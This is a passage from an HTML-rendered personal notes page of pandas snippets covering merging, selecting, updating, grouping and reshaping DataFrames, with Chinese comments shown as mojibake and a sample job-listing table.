on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># æ ¹æ® key1 å’Œ key2 è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># æ ¹æ®leftçš„keyåˆ—å’Œrightçš„indexåˆå¹¶</span></span><br><span class="line">pd.merge(left1, right1, left_on=<span class="string">&#x27;key&#x27;</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how å¯ä»¥è®¾ç½®</span></span><br><span class="line"><span class="string">rightã€left: å·¦å¤–ï¼Œå³å¤–</span></span><br><span class="line"><span class="string">outerã€inner: å…¨å¤–è¿æ¥ï¼Œå†…è¿æ¥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># é‡æ–°äº§ç”Ÿæ•°æ®</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹¼æ¥ df1ã€df2ã€df3ï¼ŒåŒæ—¶æ–°å¢ä¸€ä¸ªç´¢å¼•ï¼ˆxã€yã€zï¼‰æ¥åŒºåˆ†ä¸åŒçš„è¡¨æ•°æ®æ¥æº</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ’å…¥è¡Œ</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line">c = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">5</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">5</span>]&#125;)</span><br><span class="line">a = df.iloc[:<span class="number">2</span>,:]</span><br><span class="line">b = df.iloc[<span class="number">2</span>:,:]</span><br><span class="line">df = pd.concat([a,c,b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤ç¬¬ä¸€è¡Œ</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¡ä»¶åˆ é™¤</span></span><br><span class="line">df.drop(df[df.é‡‘ç‰Œæ•°&lt;<span class="number">20</span>].index)</span><br><span class="line">data =  data.drop(index = data[(data.ZH_Term_len == <span class="number">0</span>)].index.tolist())</span><br><span class="line"><span class="comment"># æå–å€’æ•°åä¸‰åˆ—çš„10-20è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;æ€»åˆ†&#x27;</span>:] </span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œ </span></span><br><span class="line"><span class="comment"># DataFrameæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Seriesæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œä¹‹åçš„å…¨éƒ¨è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># æå– 0-50 è¡Œï¼Œé—´éš”ä¸º 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•° ä¸ç­‰äº 10 çš„è¡Œ</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># æå–å¥‡æ•°è¡Œ</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># æå– ä¸­å›½ã€ç¾å›½ã€è‹±å›½ã€æ—¥æœ¬ã€å·´è¥¿ äº”è¡Œæ•°æ® ä¸” é‡‘ç‰Œæ•°å°äº30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;å›½å®¶å¥¥å§”ä¼š&#x27;</span>].isin([<span class="string">&#x27;ä¸­å›½&#x27;</span>,<span class="string">&#x27;ç¾å›½&#x27;</span>,<span class="string">&#x27;è‹±å›½&#x27;</span>,<span class="string">&#x27;æ—¥æœ¬&#x27;</span>,<span class="string">&#x27;å·´è¥¿&#x27;</span>]))]</span><br><span class="line"><span class="comment"># åŒ…å«æŸä¸ªå­—çš„è¡Œ</span></span><br><span class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå– ç¬¬ 0-2 è¡Œç¬¬ 0-2 åˆ—</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° + é“¶ç‰Œæ•° å¤§äº 15 çš„å›½å®¶</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° å¤§äº é‡‘ç‰Œå‡å€¼çš„å›½å®¶</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;é‡‘ç‰Œæ•° &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šä½ç½®æ’å…¥è¡Œ</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># è°ƒæ•´ é¡ºåº</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"><span class="comment"># å¯ä»¥è°ƒæ•´åˆ—çš„é¡ºåº</span></span><br><span class="line">ans.reindex([<span class="string">&#x27;installsæ€»æ•°&#x27;</span>,<span class="string">&#x27;contentRatingæœ€å¤šçš„ç±»å‹&#x27;</span>,<span class="string">&#x27;contentRatingæœ€å¤šç±»å‹ç™¾åˆ†æ¯”&#x27;</span>,<span class="string">&#x27;scoreå¹³å‡åˆ†&#x27;</span>],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¢é¡ºåº</span></span><br><span class="line">cpn_bz.iloc[[<span class="number">2</span>,<span class="number">3</span>]]=cpn_bz.iloc[[<span class="number">3</span>,<span class="number">2</span>]]</span><br></pre></td></tr></table></figure><h3><span id="create">Create</span></h3><ul><li>åˆ›å»ºDataFrame</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ list ç”Ÿæˆ</span></span><br><span class="line">nums = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>)]).reshape(<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line">colu = [<span class="string">f&#x27;col_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">inde = [<span class="string">f&#x27;row_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]  </span><br><span class="line">pd.DataFrame(data=nums,index=Finde,columns=colu)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ dict ç”Ÿæˆï¼Œç´¢å¼•è‡ªåŠ¨ç”Ÿæˆ</span></span><br><span class="line">hight = np.random.randint(<span class="number">158</span>,<span class="number">180</span>,<span class="number">10</span>)</span><br><span class="line">weight = np.random.randint(<span class="number">49</span>,<span class="number">75</span>,<span class="number">10</span>)</span><br><span class="line">pd.DataFrame(data=&#123;</span><br><span class="line">    <span class="string">&#x27;hight&#x27;</span>:hight,</span><br><span class="line">    <span class="string">&#x27;weight&#x27;</span>:weight,&#125;</span><br><span class="line">)      <span class="comment"># è¿™é‡Œæ²¡æœ‰è®¾ç½®ç´¢å¼•ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆ</span></span><br><span class="line"><span class="comment"># è¯»å–excel sheet_nameé»˜è®¤æ˜¯0ï¼Œä¼ å…¥æ•°å­—å°±æ˜¯è¯»å–ç¬¬x+1ä¸ªsheetï¼Œä¼ å…¥å­—ç¬¦ä¸²å°±æ˜¯æŸ¥æ‰¾å¯¹äºsheetçš„åå­—</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;data/2020å¹´é”€å”®æ•°æ®.xlsx&#x27;</span>,sheet_name=<span class="number">0</span>) </span><br><span class="line"><span class="comment"># è¯»å–csvæ–‡ä»¶ï¼Œé»˜è®¤ç¼–ç utf-8ï¼Œé‡åˆ°ä¸­æ–‡ä¹±ç å¯ä»¥è¯•è¯•çœ‹gbk</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data/2018å¹´åŒ—äº¬ç§¯åˆ†è½æˆ·æ•°æ®.csv&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>)  <span class="comment"># encodingå‚æ•°æŒ‡å®šæ•°æ®çš„ç¼–ç æ–¹å¼ä¸ºutf-8</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="del">Del</span></h3><ul><li><p>åˆ é™¤æŸåˆ—çš„æ•°æ®</p><ul><li><strong>axis</strong>ï¼šè½´ã€‚0 æˆ– â€˜indexâ€™ï¼Œè¡¨ç¤ºæŒ‰è¡Œåˆ é™¤ï¼›1æˆ–â€™columnsâ€™ï¼Œè¡¨ç¤ºæŒ‰åˆ—åˆ é™¤ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># del åªèƒ½åˆ ä¸€è¡Œ</span></span><br><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h3><span id="update">Update</span></h3><ul><li>whereæ“ä½œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœä¸€ä¸ªå›½å®¶çš„é‡‘ç‰Œæ•°å¤§äº 30 åˆ™å€¼ä¸º æ˜¯ï¼Œåä¹‹ä¸º å¦</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œå¤§äº30&#x27;</span>]  = np.where(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;æ˜¯&#x27;</span>, <span class="string">&#x27;å¦&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>æ›´æ–°ç´¢å¼•</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç´¢å¼•ä»1å¼€å§‹</span></span><br><span class="line">df.set_index(x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,df.shape[<span class="number">0</span>]+<span class="number">1</span>))</span><br><span class="line"><span class="comment"># ä½¿ç”¨æŸåˆ—ä½œä¸ºç´¢å¼•ï¼Œé»˜è®¤åˆ é™¤è¯¥åˆ— å³drop=True</span></span><br><span class="line">df.set_index(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line"><span class="comment"># ä¿®æ”¹ç´¢å¼•å å¦‚æœæ˜¯å¤šä¸ªç´¢å¼•å¯ä»¥é€šè¿‡[]ä¼ å…¥</span></span><br><span class="line">df.rename_axis(<span class="string">&#x27;æ—¥æœŸ&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šå¤šä¸ªç´¢å¼•</span></span><br><span class="line">df=df.set_index([<span class="string">&#x27;date&#x27;</span>,<span class="string">&#x27;val&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¿®æ”¹å•ä¸ªç´¢å¼•å</span></span><br><span class="line">df.rename_axis(index=&#123;<span class="string">&#x27;val&#x27;</span>:<span class="string">&#x27;v&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># è¿˜åŸç´¢å¼•ï¼Œä½¿ç”¨pandasç”Ÿæˆé»˜è®¤ç´¢å¼•</span></span><br><span class="line">df.reset_index()</span><br><span class="line"><span class="comment"># åˆ é™¤ç´¢å¼•</span></span><br><span class="line">df.reset_index(drop=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>replace</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†é‡‘ç‰Œæ•°åˆ—çš„æ•°å­— 0 æ›¿æ¢ä¸º æ— </span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;æ— &#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#åŒæ—¶æ›¿æ¢ 1å°† æ—  æ›¿æ¢ä¸º ç¼ºå¤±å€¼ 2å°† 0 æ›¿æ¢ä¸º None</span></span><br><span class="line">df.replace([<span class="string">&#x27;æ— &#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Seriesä¸­replaceå­—ç¬¦ä¸²éƒ¨åˆ†éœ€è¦åŠ ä¸Š.str. æ”¯æŒé“¾å¼ç¼–ç¨‹</span></span><br><span class="line">df.employmentLength.<span class="built_in">str</span>.replace(<span class="string">&#x27;years&#x27;</span>,<span class="string">&#x27;&#x27;</span>).<span class="built_in">str</span>.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda å’Œ str</span></span><br><span class="line">df.price = df.price.<span class="built_in">str</span>.replace(<span class="string">&#x27;[$|,]&#x27;</span>,<span class="string">&#x27;&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.price = df.price.apply(<span class="keyword">lambda</span> x:x.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)).astype(<span class="string">&#x27;float&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>fill</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill ä»åé¢å¾€å‰å¡«å……</span></span><br><span class="line"><span class="string">ffill ä»å‰å¾€å</span></span><br><span class="line"><span class="string">é»˜è®¤åˆ—æ–¹å‘å¡«å……0ï¼Œ1ä½¿ç”¨è¡Œæ–¹å‘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>- </p><h3><span id="retrieve">Retrieve</span></h3><ul><li>éšæœºè¿”å›nä¸ªæ ·æœ¬</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sample(n)</span><br></pre></td></tr></table></figure><ul><li>pivotä¸groupby</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>])</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby è”åˆ apply</span></span><br><span class="line">q2[<span class="string">&#x27;æ‹çˆ±çš„ç”·ç”Ÿæ¯”ä¾‹&#x27;</span>] = df[df[<span class="string">&#x27;romantic&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;age&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.sex==<span class="string">&#x27;M&#x27;</span>).groupby(<span class="string">&#x27;age&#x27;</span>).<span class="built_in">sum</span>()/q2_rom.groupby(<span class="string">&#x27;age&#x27;</span>).count()[<span class="string">&#x27;sex&#x27;</span>]</span><br><span class="line"><span class="comment"># ç›¸å½“äºåœ¨[]é‡Œé¢å†™æ¡ä»¶</span></span><br><span class="line">df[df[<span class="string">&#x27;smoker&#x27;</span>]==<span class="string">&#x27;yes&#x27;</span>].groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).count()</span><br><span class="line"><span class="comment"># countå’Œsumæœ‰åŒºåˆ«ï¼Œä¸€ä¸ªæ˜¯è®¡ç®—boolåæ±‚å’Œï¼Œä¸€ä¸ªåœ¨æ¡ä»¶ç­›é€‰åæ±‚ä¸ªæ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).apply(<span class="keyword">lambda</span> x:x.smoker==<span class="string">&#x27;yes&#x27;</span>).groupby(<span class="string">&#x27;ageåŒºé—´&#x27;</span>).<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠgroupbyçš„å…ƒç´ å–å‡ºæ¥</span></span><br><span class="line">pieces = <span class="built_in">dict</span>(<span class="built_in">list</span>(df.groupby(<span class="string">&#x27;key1&#x27;</span>)))</span><br><span class="line">pieces[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="comment"># groupby ä½¿ç”¨å­—å…¸</span></span><br><span class="line">by_column = people.groupby(mapping, axis=<span class="number">1</span>)</span><br><span class="line">by_column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>unstack</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®—å‰ååå„å›½æ¯æ—¥å¥–ç‰Œæ•°é‡åˆè®¡</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šå¯¹äºç¬¬ä¸€å¤©æ²¡æœ‰æ•°æ®çš„å›½å®¶ç”¨0å¡«å……ï¼Œå…¶ä½™æ—¶é—´çš„ç¼ºå¤±å€¼ç”¨ä¸Šä¸€æ—¥æ•°æ®å¡«å……</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;å›½å®¶&#x27;</span>).count().sort_values(<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;å›½å®¶&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># å¯¹äºä¸¤å±‚çš„Series </span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">9</span>),</span><br><span class="line">                 index=[[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">                        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="comment"># é€‰ç¬¬äºŒä¸ªç´¢å¼•å€¼çš„æ“ä½œï¼š</span></span><br><span class="line">data[:,<span class="number">2</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">data.unstack().iloc[:,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li>æ•°æ®èšåˆ</li></ul><table><thead><tr><th align="right">positionName</th><th align="right">companySize</th><th align="right">industryField</th><th align="right">financeStage</th><th align="right">companyLabelList</th><th align="right">firstType</th><th align="right">secondType</th><th align="right">thirdType</th><th align="right">createTime</th><th align="right">district</th><th align="right">salary</th><th align="right">workYear</th><th align="right">jobNature</th><th align="right">education</th><th align="right">positionAdvantage</th><th align="right">imState</th><th align="right">score</th><th align="right">matchScore</th><th align="right">famousCompany</th><th align="right">Hobby</th><th></th></tr></thead><tbody><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜ç»©æ•ˆå¥–é‡‘â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>â€˜å¸¦è–ªå¹´å‡â€™</td></tr><tr><td align="right">0</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">50-150äºº</td><td align="right">ç§»åŠ¨äº’è”ç½‘,ç”µå•†</td><td align="right">Aè½®</td><td align="right">[â€˜ç»©æ•ˆå¥–é‡‘â€™, â€˜å¸¦è–ªå¹´å‡â€™, â€˜å®šæœŸä½“æ£€â€™, â€˜å¼¹æ€§å·¥ä½œâ€™]</td><td align="right">äº§å“|éœ€æ±‚|é¡¹ç›®ç±»</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">æ•°æ®åˆ†æ</td><td align="right">2020&#x2F;3&#x2F;16 11:00</td><td align="right">ä½™æ­åŒº</td><td align="right">37500</td><td align="right">1-3å¹´</td><td align="right">å…¨èŒ</td><td align="right">æœ¬ç§‘</td><td align="right">äº”é™©ä¸€é‡‘ã€å¼¹æ€§å·¥ä½œã€å¸¦è–ªå¹´å‡ã€å¹´åº¦ä½“æ£€</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td 